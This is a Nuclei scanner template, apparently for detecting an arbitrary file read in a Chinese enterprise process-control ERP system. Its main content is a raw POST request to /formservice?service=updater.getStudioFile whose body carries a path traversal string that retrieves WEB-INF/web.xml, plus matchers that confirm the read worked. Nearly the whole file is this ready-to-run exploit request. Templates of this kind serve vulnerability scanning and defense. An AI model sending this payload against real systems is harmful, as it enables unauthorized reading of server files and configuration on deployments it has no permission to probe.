id: skzy-erp-formservice-fileread
info:
  name: 时空智友企业流程化管控系统 ERP formservice - fileread
  author: leadlife
  severity: high
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: skzy,erp,oa,fileread

http:
  - raw:
      - |
        POST /formservice?service=updater.getStudioFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Content-Type: application/json
        Accept-Encoding: gzip
        Content-Length: 21

        ..\..\WEB-INF/web.xml
        
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml','servlet-class','servlet-name')
        condition: and

      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'找不到指定的文件')
        condition: and